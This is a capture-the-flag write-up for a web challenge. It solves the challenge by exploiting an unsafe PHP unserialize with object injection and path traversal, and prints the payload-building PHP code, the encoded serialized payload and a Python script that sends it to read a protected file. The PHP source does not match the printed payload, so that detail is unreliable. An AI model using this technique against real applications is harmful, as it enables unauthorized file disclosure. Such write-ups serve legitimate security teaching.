Web C - 200
	Ah, the art of looking back on what you have accomplished.

[Web C](http://web.camsctf.com/12)

-------------

It seems that we wish to read a file in `/1/`. Looking in the source code, we see that the file we want is `pass12.txt` (which we don't have permission to), and there's also a `useful.php`. Going over to http://web.camsctf.com/12/useful.php, we see a serializer/unserializer! Interesting...

![useful.php](http://i.imgur.com/lW85ZQ4.png)

We now look at response.js, which says at the bottom:

	// I have reason to believe that the true purpose of read.php is located in read.png - Lujing

`read.php` is what happens when we click the button in useful.php, and read.png shows us:

![read.png](http://web.camsctf.com/12/read.png)

Wow! An unsafe `unserialize`! Using PHP object injection (https://www.owasp.org/index.php/PHP_Object_Injection), we can get that file!

Our php source code:
```php

<?php
class readfile
{
   public $private_file = 'readfile("../1/pass12.txt")';
}

print urlencode(serialize(new readfile));
?>

```

Which gives us:

	O%3A8%3A%22readfile%22%3A1%3A%7Bs%3A22%3A%22%00readfile%00private_file%22%3Bs%3A15%3A%22..%2F1%2Fpass12.txt%22%3B%7D

We then write a quick python script to solve the problem:

```python
import requests
cooky = {'data':'O%3A8%3A%22readfile%22%3A1%3A%7Bs%3A22%3A%22%00readfile%00private_file%22%3Bs%3A15%3A%22..%2F1%2Fpass12.txt%22%3B%7D'}
r = requests.post("http://web.camsctf.com/12/read.php",cookies=cooky)
print(r.text)
```

And we get:

`path_traversal_con_object_injection`

We plug this into the password box to get our flag!

Flag: `{am_i_a_real_hacker_now}`
